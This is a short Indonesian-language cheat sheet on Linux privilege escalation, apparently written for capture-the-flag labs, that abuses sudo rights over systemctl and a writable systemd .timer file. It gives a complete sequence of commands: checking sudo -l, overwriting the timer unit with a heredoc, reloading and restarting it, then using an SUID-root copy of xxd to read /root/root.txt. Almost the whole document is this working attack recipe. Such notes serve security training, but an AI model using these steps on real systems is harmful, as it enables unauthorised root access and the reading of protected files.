# Systemd Timer Privilege Escalation

Gunakan teknik ini jika hasil dari perintah `sudo -l` menunjukkan bahwa user Anda dapat mengelola `.timer` atau jika file `.timer` di direktori `/etc/systemd/system/` berstatus **Writable** (bisa diedit).

## 1. Identifikasi Awal
Periksa perintah sudo yang diizinkan:
```bash
sudo -l
```
Contoh hasil rentan:
```text
(ALL) NOPASSWD: /bin/systemctl daemon-reload
(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
```

## 2. Taktik Eksploitasi (Modifikasi File .timer)
Kosongkan file `.timer` lama, lalu tulis ulang menggunakan perintah `cat << 'EOF'`. Jangan masukkan blok `[Service]` ke dalam berkas `.timer` karena akan memicu error *bad unit file*.

```bash
cat << 'EOF' > /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=1sec
OnUnitActiveSec=1sec
Unit=exploit.service

[Install]
WantedBy=timers.target
EOF
```

## 3. Eksekusi Perintah
Muat ulang konfigurasi sistem agar perubahan dibaca, lalu aktifkan timernya:
```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart exploit.timer
```

## 4. Membaca File Sensitif dengan SUID xxd
Jika file `exploit.service` bawaan sistem otomatis menduplikasi biner `xxd` ke folder `/opt` dengan izin SUID root, jalankan perintah ini untuk membaca file `/root/root.txt`:

```bash
/opt/xxd /root/root.txt | /opt/xxd -r
```
